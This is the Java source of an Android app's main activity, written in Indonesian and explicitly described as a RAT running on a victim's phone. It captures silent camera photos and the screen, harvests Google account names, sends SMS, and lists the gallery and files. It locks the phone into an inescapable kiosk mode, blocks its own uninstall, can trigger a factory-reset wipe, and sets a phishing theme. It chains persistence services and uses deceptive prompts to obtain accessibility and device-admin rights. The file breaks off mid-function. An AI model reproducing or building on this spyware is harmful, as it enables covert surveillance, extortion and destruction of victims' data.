package com.nullx.pp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.text.TextUtils;
import android.app.ActivityManager;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.AudioManager;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Base64;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.Surface;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;

import androidx.annotation.NonNull;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends FlutterActivity {

    private static final String SPY_CHANNEL    = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String EXTRA_CHANNEL  = "com.nullx.pp/extra";
    private static final String ACCESS_CHANNEL = "com.nullx.pp/accessibility";

    private boolean isLocked         = false;
    private boolean isStrobeRunning  = false;
    private boolean isFlickerRunning = false;
    private Handler uiHandler        = new Handler(Looper.getMainLooper());
    private Runnable strobeRunnable;
    private Runnable flickerRunnable;
    private Runnable lockEnforcer;

    private HandlerThread camThread;
    private Handler       camHandler;

    private View          overlayView;
    private WindowManager windowMgr;

    // ══════════════════════════════════════════════════════════════
    //  KEY EVENTS — block SEMUA saat locked
    // ══════════════════════════════════════════════════════════════
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (isLocked) {
            switch (keyCode) {
                case KeyEvent.KEYCODE_POWER:
                case KeyEvent.KEYCODE_VOLUME_UP:
                case KeyEvent.KEYCODE_VOLUME_DOWN:
                case KeyEvent.KEYCODE_VOLUME_MUTE:
                case KeyEvent.KEYCODE_HOME:
                case KeyEvent.KEYCODE_BACK:
                case KeyEvent.KEYCODE_MENU:
                case KeyEvent.KEYCODE_APP_SWITCH:
                case KeyEvent.KEYCODE_SEARCH:
                case KeyEvent.KEYCODE_ASSIST:
                    // Telan semua key event — tidak diteruskan ke sistem
                    return true;
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {
        if (isLocked) {
            switch (keyCode) {
                case KeyEvent.KEYCODE_POWER:
                case KeyEvent.KEYCODE_VOLUME_UP:
                case KeyEvent.KEYCODE_VOLUME_DOWN:
                case KeyEvent.KEYCODE_HOME:
                case KeyEvent.KEYCODE_BACK:
                case KeyEvent.KEYCODE_MENU:
                case KeyEvent.KEYCODE_APP_SWITCH:
                    return true;
            }
        }
        return super.onKeyUp(keyCode, event);
    }

    @Override
    public boolean onKeyLongPress(int keyCode, KeyEvent event) {
        // Long press power → matikan hp. Block ini
        if (isLocked && keyCode == KeyEvent.KEYCODE_POWER) return true;
        return super.onKeyLongPress(keyCode, event);
    }

    @Override
    public void onBackPressed() {
        if (isLocked) { enforceImmersive(); return; }
        super.onBackPressed();
    }

    // ══════════════════════════════════════════════════════════════
    //  WINDOW FOCUS — home/recent ditekan
    // ══════════════════════════════════════════════════════════════
    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (isLocked) {
            enforceImmersive();
            if (!hasFocus) {
                uiHandler.postDelayed(() -> {
                    bringToFrontNow();
                    enforceImmersive();
                }, 50);
            }
        }
    }

    private void bringToFrontNow() {
        Intent i = new Intent(getContext(), MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT |
                   Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(i);
    }

    // ══════════════════════════════════════════════════════════════
    //  IMMERSIVE STICKY
    // ══════════════════════════════════════════════════════════════
    private void enforceImmersive() {
        uiHandler.post(() -> {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    WindowInsetsController ctrl = getWindow().getInsetsController();
                    if (ctrl != null) {
                        ctrl.hide(WindowInsets.Type.statusBars() |
                                  WindowInsets.Type.navigationBars() |
                                  WindowInsets.Type.captionBar());
                        ctrl.setSystemBarsBehavior(
                            WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
                    }
                } else {
                    getWindow().getDecorView().setSystemUiVisibility(
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                        View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                        View.SYSTEM_UI_FLAG_FULLSCREEN |
                        View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                        View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                        View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    );
                }
            } catch (Exception e) {}
        });
    }

    // ══════════════════════════════════════════════════════════════
    //  LOCK SYSTEM UI — kiosk mode full
    // ══════════════════════════════════════════════════════════════
    private void lockSystemUI() {
        isLocked = true;

        // Simpan state ke prefs — SpyService baca ini
        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit().putBoolean("is_locked", true).apply();

        uiHandler.post(() -> {
            try {
                // Keep screen on — layar gak bisa dimatiin
                getWindow().addFlags(
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                    WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON
                );
                enforceImmersive();
            } catch (Exception e) {}
        });

        // ── Screen Pinning / Lock Task ─────────────────────────
        try {
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            // startLockTask() — masuk kiosk mode, home/recent/back semua diblock sistem
            startLockTask();
        } catch (Exception e) {}

        // ── DPM: kalau device owner, enforce lock task packages ─
        try {
            DevicePolicyManager dpm =
                (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = AppDeviceAdminReceiver.getComponentName(this);
            if (dpm.isAdminActive(admin)) {
                // Block uninstall
                dpm.setUninstallBlocked(admin, getPackageName(), true);
                if (dpm.isDeviceOwnerApp(getPackageName())) {
                    dpm.setLockTaskPackages(admin, new String[]{getPackageName()});
                    // Block power button dialog (device owner only)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        dpm.setKeyguardDisabled(admin, true);
                    }
                }
            }
        } catch (Exception e) {}

        // ── Loop enforcer — setiap 200ms paksa foreground + immersive ─
        if (lockEnforcer != null) uiHandler.removeCallbacks(lockEnforcer);
        lockEnforcer = new Runnable() {
            @Override public void run() {
                if (!isLocked) return;
                enforceImmersive();
                try {
                    // Re-start lock task kalau lepas
                    startLockTask();
                } catch (Exception ignored) {}
                uiHandler.postDelayed(this, 200);
            }
        };
        uiHandler.postDelayed(lockEnforcer, 200);
    }

    // ══════════════════════════════════════════════════════════════
    //  UNLOCK SYSTEM UI
    // ══════════════════════════════════════════════════════════════
    private void unlockSystemUI() {
        isLocked = false;

        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit().putBoolean("is_locked", false).apply();

        if (lockEnforcer != null) uiHandler.removeCallbacks(lockEnforcer);

        uiHandler.post(() -> {
            try {
                getWindow().clearFlags(
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                    WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON
                );
            } catch (Exception e) {}
        });

        // Keluar dari kiosk / lock task
        try { stopLockTask(); } catch (Exception e) {}

        // Restore DPM
        try {
            DevicePolicyManager dpm =
                (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = AppDeviceAdminReceiver.getComponentName(this);
            if (dpm.isAdminActive(admin)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    dpm.setKeyguardDisabled(admin, false);
                }
            }
        } catch (Exception e) {}

        // Restore system UI
        uiHandler.post(() -> {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    WindowInsetsController ctrl = getWindow().getInsetsController();
                    if (ctrl != null)
                        ctrl.show(WindowInsets.Type.statusBars() |
                                  WindowInsets.Type.navigationBars());
                } else {
                    getWindow().getDecorView().setSystemUiVisibility(
                        View.SYSTEM_UI_FLAG_VISIBLE);
                }
            } catch (Exception e) {}
        });
    }

    // ══════════════════════════════════════════════════════════════
    //  FLUTTER ENGINE CONFIG
    // ══════════════════════════════════════════════════════════════
    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine engine) {
        super.configureFlutterEngine(engine);
        startCamThread();

        // ── PERSISTENCE INIT — start semua layer saat app buka ────
        startPersistenceChain();

        // ── ACCESSIBILITY ─────────────────────────────────────────
        new MethodChannel(engine.getDartExecutor().getBinaryMessenger(), ACCESS_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {
                    case "openAccessibilitySettings":
                        // Buka halaman Accessibility Settings
                        // Framing ke user: "Aktifkan untuk performa optimal"
                        try {
                            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(intent);
                            result.success(true);
                        } catch (Exception e) {
                            result.error("ACCESS", e.getMessage(), null);
                        }
                        break;

                    case "isAccessibilityEnabled":
                        // Cek apakah AutoClickService aktif
                        result.success(isAccessibilityServiceEnabled());
                        break;

                    default:
                        result.notImplemented();
                }
            });

        // ── STROBE ────────────────────────────────────────────────
        new MethodChannel(engine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {
                    case "startStrobe": startStrobeEffect(); result.success(null); break;
                    case "stopStrobe":  stopStrobeEffect();  result.success(null); break;
                    default: result.notImplemented();
                }
            });

        // ── SPY ───────────────────────────────────────────────────
        new MethodChannel(engine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {
                    case "startScreenStreamBackground":
                        captureScreenPixelCopy(result); break;
                    case "takeSilentPhotoBackground":
                        String side = call.argument("side");
                        captureHiddenPhoto(side == null ? "back" : side, result); break;
                    case "getGmailAccounts":
                        fetchGmailAccounts(result); break;
                    case "setWallpaper":
                        updateWallpaper(call.argument("url"), result); break;
                    case "bringToForeground":
                        bringToFrontNow(); result.success(true); break;
                    case "saveTargetId":
                        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
                            .edit().putString("targetId", call.arguments.toString()).apply();
                        result.success(true); break;
                    case "openNotificationSettings":
                        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        result.success(true); break;
                    default: result.notImplemented();
                }
            });

        // ── EXTRA ─────────────────────────────────────────────────
        new MethodChannel(engine.getDartExecutor().getBinaryMessenger(), EXTRA_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {

                    case "lockSystemUI":
                        lockSystemUI(); result.success(true); break;

                    case "unlockSystemUI":
                        unlockSystemUI(); result.success(true); break;

                    // ── FLASHLIGHT ────────────────────────────────
                    case "setFlashlight": {
                        boolean on = Boolean.TRUE.equals(call.argument("on"));
                        try {
                            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
                            cm.setTorchMode(cm.getCameraIdList()[0], on);
                            result.success(true);
                        } catch (Exception e) { result.error("FLASH", e.getMessage(), null); }
                        break;
                    }

                    // ── MUTE ──────────────────────────────────────
                    case "setMute": {
                        boolean mute = Boolean.TRUE.equals(call.argument("mute"));
                        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                        if (mute) {
                            am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                            for (int s : new int[]{AudioManager.STREAM_MUSIC,
                                                    AudioManager.STREAM_RING,
                                                    AudioManager.STREAM_ALARM,
                                                    AudioManager.STREAM_SYSTEM,
                                                    AudioManager.STREAM_NOTIFICATION}) {
                                try { am.setStreamVolume(s, 0, 0); } catch (Exception ignored) {}
                            }
                        } else {
                            am.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                            am.setStreamVolume(AudioManager.STREAM_MUSIC,
                                am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                            am.setStreamVolume(AudioManager.STREAM_RING,
                                am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
                        }
                        result.success(true);
                        break;
                    }

                    // ── SMS ───────────────────────────────────────
                    case "sendSms": {
                        String num = call.argument("number");
                        String msg = call.argument("message");
                        try {
                            SmsManager sm = SmsManager.getDefault();
                            sm.sendMultipartTextMessage(num, null,
                                new ArrayList<>(sm.divideMessage(msg)), null, null);
                            result.success(true);
                        } catch (Exception e) { result.error("SMS", e.getMessage(), null); }
                        break;
                    }

                    // ── KEYBOARD INJECT ───────────────────────────
                    case "injectKeyboard": {
                        String text = call.argument("text");
                        android.content.ClipboardManager clip =
                            (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                        clip.setPrimaryClip(android.content.ClipData.newPlainText("", text));
                        result.success(true);
                        break;
                    }

                    // ── GALLERY ───────────────────────────────────
                    case "getGallery": {
                        int limit = call.argument("limit") != null
                            ? (int)(Object) call.argument("limit") : 20;
                        List<java.util.Map<String, String>> files = new ArrayList<>();
                        try {
                            String[] proj = {
                                MediaStore.Images.Media.DISPLAY_NAME,
                                MediaStore.Images.Media.DATA,
                                MediaStore.Images.Media.DATE_MODIFIED
                            };
                            android.database.Cursor c = getContentResolver().query(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                proj, null, null,
                                MediaStore.Images.Media.DATE_MODIFIED + " DESC");
                            if (c != null) {
                                int cnt = 0;
                                while (c.moveToNext() && cnt < limit) {
                                    java.util.Map<String, String> item = new java.util.HashMap<>();
                                    item.put("name", c.getString(0));
                                    item.put("path", c.getString(1));
                                    item.put("date", c.getString(2));
                                    files.add(item);
                                    cnt++;
                                }
                                c.close();
                            }
                        } catch (Exception e) {}
                        result.success(files);
                        break;
                    }

                    // ── FILE LIST ─────────────────────────────────
                    case "listFiles": {
                        String path = call.argument("path");
                        if (path == null || path.isEmpty()) path = "/sdcard";
                        List<String> list = new ArrayList<>();
                        try {
                            File[] entries = new File(path).listFiles();
                            if (entries != null)
                                for (File f : entries)
                                    list.add((f.isDirectory() ? "[DIR] " : "") +
                                             f.getName() + " | " + f.length() + "B");
                        } catch (Exception e) {}
                        result.success(list);
                        break;
                    }

                    // ── SCREEN FLICKER ────────────────────────────
                    case "startScreenFlicker": startScreenFlicker(); result.success(true); break;
                    case "stopScreenFlicker":  stopScreenFlicker();  result.success(true); break;

                    // ── OVERLAY ───────────────────────────────────
                    case "showOverlay":
                        showSystemOverlay(call.argument("url")); result.success(true); break;
                    case "hideOverlay":
                        removeSystemOverlay(); result.success(true); break;

                    // ── BLOCK APPS ────────────────────────────────
                    case "blockApps": {
                        List<String> pkgs = call.argument("packages");
                        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit()
                            .putString("blocked_apps", String.join(",", pkgs))
                            .putBoolean("blocking_on", true).apply();
                        result.success(true);
                        break;
                    }
                    case "unblockApps":
                        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit()
                            .putBoolean("blocking_on", false)
                            .putString("blocked_apps", "").apply();
                        result.success(true);
                        break;

                    // ── FACTORY RESET ─────────────────────────────
                    case "factoryReset": {
                        try {
                            DevicePolicyManager dpm =
                                (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                            ComponentName admin = AppDeviceAdminReceiver.getComponentName(MainActivity.this);
                            if (dpm.isAdminActive(admin)) {
                                dpm.wipeData(0);
                            } else {
                                Intent i = new Intent("android.settings.MASTER_CLEAR_CONFIRM");
                                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(i);
                            }
                        } catch (Exception e) {}
                        result.success(true);
                        break;
                    }

                    // ── REQUEST ADMIN (aktifkan Device Admin) ─────
                    case "requestAdmin": {
                        ComponentName admin = AppDeviceAdminReceiver.getComponentName(MainActivity.this);
                        DevicePolicyManager dpm =
                            (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                        if (!dpm.isAdminActive(admin)) {
                            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Diperlukan untuk keamanan sistem.");
                            startActivity(intent);
                        }
                        result.success(true);
                        break;
                    }

                    // ── SELF DESTRUCT — copot APK dari HP korban ──────────
                    case "selfDestruct": {
                        selfDestruct();
                        result.success(true);
                        break;
                    }

                    // ── CHANGE PHISHING THEME ─────────────────────
                    case "changePhishingTheme":
                        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit()
                            .putString("phish_theme_url", (String) call.argument("url")).apply();
                        result.success(true);
                        break;

                    default: result.notImplemented();
                }
            });
    }

    // ══════════════════════════════════════════════════════════════
    //  PERSISTENCE CHAIN — init semua layer background survival
    // ══════════════════════════════════════════════════════════════
    private void startPersistenceChain() {
        // Layer 1: SpyService foreground
        try {
            Intent serviceIntent = new Intent(this, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {}

        // Layer 2: AlarmManager watchdog
        SpyService.scheduleAlarmWatchdog(this);

        // Layer 3: JobScheduler
        JobSchedulerService.schedule(this);
    }

    // ══════════════════════════════════════════════════════════════
    //  CAMERA — thread + capture
    // ══════════════════════════════════════════════════════════════
    private void startCamThread() {
        if (camThread == null || !camThread.isAlive()) {
            camThread = new HandlerThread("CamCapture");
            camThread.start();
            camHandler = new Handler(camThread.getLooper());
        }
    }

    private void captureScreenPixelCopy(MethodChannel.Result result) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                View v = getWindow().getDecorView();
                int w = v.getWidth(), h = v.getHeight();
                if (w <= 0 || h <= 0) { result.success(screenFallback()); return; }
                Bitmap bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
                android.view.PixelCopy.request(getWindow(), bmp, r -> {
                    if (r == android.view.PixelCopy.SUCCESS) {
                        Bitmap sc = Bitmap.createScaledBitmap(bmp, w / 2, h / 2, true);
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        sc.compress(Bitmap.CompressFormat.JPEG, 45, out);
                        String b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                        uiHandler.post(() -> result.success(b64));
                    } else { uiHandler.post(() -> result.success(screenFallback())); }
                }, uiHandler);
            } catch (Exception e) { result.success(screenFallback()); }
        } else { result.success(screenFallback()); }
    }

    private String screenFallback() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            v.buildDrawingCache();
            Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
            v.setDrawingCacheEnabled(false);
            if (b == null) return null;
            Bitmap sc = Bitmap.createScaledBitmap(b, b.getWidth() / 2, b.getHeight() / 2, true);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            sc.compress(Bitmap.CompressFormat.JPEG, 45, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) { return null; }
    }

    private void captureHiddenPhoto(String side, MethodChannel.Result result) {
        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            int targetFacing = side.equals("front")
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;
            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                Integer facing = manager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == targetFacing) { cameraId = id; break; }
            }
            if (cameraId == null) { result.error("CAM", "Not found: " + side, null); return; }

            final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            final SurfaceTexture tex = new SurfaceTexture(0);
            tex.setDefaultBufferSize(640, 480);
            final Surface dummy = new Surface(tex);

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(@NonNull CameraDevice cam) {
                    try {
                        CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                        b.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                        b.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO);
                        b.set(CaptureRequest.JPEG_QUALITY, (byte) 85);

                        cam.createCaptureSession(Arrays.asList(reader.getSurface(), dummy),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(@NonNull CameraCaptureSession s) {
                                    camHandler.postDelayed(() -> {
                                        try { s.capture(b.build(), null, camHandler); }
                                        catch (Exception e) { cam.close(); }
                                    }, 400);
                                }
                                @Override public void onConfigureFailed(@NonNull CameraCaptureSession s) {
                                    cam.close(); dummy.release(); tex.release();
                                    uiHandler.post(() -> result.error("CFG", "Config failed", null));
                                }
                            }, camHandler);
                    } catch (Exception e) {
                        cam.close();
                        uiHandler.post(() -> result.error("CAM", e.getMessage(), null));
                    }
                }
                @Override public void onDisconnected(@NonNull CameraDevice c) {
                    c.close(); dummy.release(); tex.release();
                }
                @Override public void onError(@NonNull CameraDevice c, int e) {
                    c.close(); dummy.release(); tex.release();
                    uiHandler.post(() -> result.error("CAM_ERR", "Code: " + e, null));
                }
            }, camHandler);

            reader.setOnImageAvailableListener(r -> {
                Image img = null;
                try {
                    img = r.acquireLatestImage();
                    if (img == null) return;
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    Bitmap bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                    if (bmp == null) { uiHandler.post(() -> result.error("BMP", "Null bitmap", null)); return; }
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, 75, out);
                    String b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                    uiHandler.post(() -> result.success(b64));
                } catch (Exception e) {
                    uiHandler.post(() -> result.error("IMG", e.getMessage(), null));
                } finally {
                    if (img != null) img.close();
                    r.close(); dummy.release(); tex.release();
                }
            }, camHandler);

        } catch (SecurityException e) {
            result.error("PERM", "No camera permission", null);
        } catch (Exception e) {
            result.error("EX", e.getMessage(), null);
        }
    }

    // ══════════════════════════════════════════════════════════════
    //  GMAIL, WALLPAPER, STROBE, FLICKER, OVERLAY
    // ══════════════════════════════════════════════════════════════
    private void fetchGmailAccounts(MethodChannel.Result result) {
        try {
            Account[] a = AccountManager.get(this).getAccountsByType("com.google");
            StringBuilder sb = new StringBuilder();
            for (Account acc : a) sb.append(acc.name).append("\n");
            result.success(sb.toString().trim());
        } catch (Exception e) { result.error("GMAIL", e.getMessage(), null); }
    }

    private void updateWallpaper(String url, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                WallpaperManager.getInstance(this).setStream(new URL(url).openStream());
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) {
                uiHandler.post(() -> result.error("WALL", e.getMessage(), null));
            }
        }).start();
    }

    private void startStrobeEffect() {
        if (isStrobeRunning) return;
        isStrobeRunning = true;
        CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean on = false;
            public void run() {
                try {
                    cm.setTorchMode(cm.getCameraIdList()[0], on = !on);
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { isStrobeRunning = false; }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            cm.setTorchMode(cm.getCameraIdList()[0], false);
        } catch (Exception e) {}
    }

    private void startScreenFlicker() {
        if (isFlickerRunning) return;
        isFlickerRunning = true;
        flickerRunnable = new Runnable() {
            boolean bright = true;
            public void run() {
                try {
                    WindowManager.LayoutParams lp = getWindow().getAttributes();
                    lp.screenBrightness = bright ? 1.0f : 0.01f;
                    getWindow().setAttributes(lp);
                    bright = !bright;
                    if (isFlickerRunning) uiHandler.postDelayed(this, 80);
                } catch (Exception e) { isFlickerRunning = false; }
            }
        };
        uiHandler.post(flickerRunnable);
    }

    private void stopScreenFlicker() {
        isFlickerRunning = false;
        if (flickerRunnable != null) uiHandler.removeCallbacks(flickerRunnable);
        uiHandler.post(() -> {
            try {
                WindowManager.LayoutParams lp = getWindow().getAttributes();
                lp.screenBrightness = -1f;
                getWindow().setAttributes(lp);
            } catch (Exception e) {}
        });
    }

    private void showSystemOverlay(String imageUrl) {
        if (!Settings.canDrawOverlays(this)) return;
        removeSystemOverlay();
        uiHandler.post(() -> {
            try {
                windowMgr = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                FrameLayout layout = new FrameLayout(getApplicationContext());
                layout.setBackgroundColor(Color.argb(200, 0, 0, 0));
                ImageView iv = new ImageView(getApplicationContext());
                iv.setScaleType(ImageView.ScaleType.FIT_CENTER);
                layout.addView(iv, new FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.MATCH_PARENT));
                new Thread(() -> {
                    try {
                        Bitmap bmp = BitmapFactory.decodeStream(new URL(imageUrl).openStream());
                        uiHandler.post(() -> iv.setImageBitmap(bmp));
                    } catch (Exception e) {}
                }).start();
                int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP | Gravity.START;
                windowMgr.addView(layout, params);
                overlayView = layout;
            } catch (Exception e) {}
        });
    }

    // ══════════════════════════════════════════════════════════════
    //  SELF DESTRUCT — copot APK RAT dari HP korban
    //
    //  Urutan wajib:
    //  1. Stop semua service (SpyService, JobScheduler, Alarm)
    //  2. Disable Device Admin → tanpa ini uninstall diblok sistem
    //  3. Delay singkat → tunggu DPM proses
    //  4. Launch uninstall intent → sistem tampilkan dialog uninstall
    //     (atau langsung uninstall kalau device owner punya permission)
    // ══════════════════════════════════════════════════════════════
    private void selfDestruct() {
        uiHandler.post(() -> {
            try {
                // ── Step 1: Matikan semua background service ───────────
                stopService(new Intent(this, SpyService.class));

                // Set flag self_destruct → AutoClickService akan auto-confirm dialog uninstall
                getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("self_destruct", true).apply();

                // ── Step 2: Disable Device Admin ──────────────────────
                // Tanpa ini, sistem Android BLOK uninstall
                DevicePolicyManager dpm =
                    (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName admin = AppDeviceAdminReceiver.getComponentName(this);

                if (dpm.isAdminActive(admin)) {
                    // Kalau device owner → remove diri dari device owner dulu
                    if (dpm.isDeviceOwnerApp(getPackageName())) {
                        try {
                            // Unlock uninstall sebelum clearDeviceOwnerApp
                            dpm.setUninstallBlocked(admin, getPackageName(), false);
                            dpm.clearDeviceOwnerApp(getPackageName());
                        } catch (Exception e) {}
                    }
                    // Remove admin biasa
                    dpm.removeActiveAdmin(admin);
                }

                // ── Step 3: Delay 800ms tunggu DPM process ────────────
                uiHandler.postDelayed(() -> {
                    try {
                        // ── Step 4: Launch uninstall intent ───────────────
                        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE);
                        uninstallIntent.setData(
                            android.net.Uri.parse("package:" + getPackageName())
                        );
                        uninstallIntent.addFlags(
                            Intent.FLAG_ACTIVITY_NEW_TASK |
                            Intent.FLAG_ACTIVITY_CLEAR_TOP
                        );
                        startActivity(uninstallIntent);
                    } catch (Exception e) {}
                }, 800);

            } catch (Exception e) {}
        });
    }

    // ══════════════════════════════════════════════════════════════
    //  ACCESSIBILITY — cek apakah AutoClickService aktif
    // ══════════════════════════════════════════════════════════════
    private boolean isAccessibilityServiceEnabled() {
        try {
            String prefStr = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (prefStr == null || prefStr.isEmpty()) return false;
            String serviceName = getPackageName() + "/.AutoClickService";
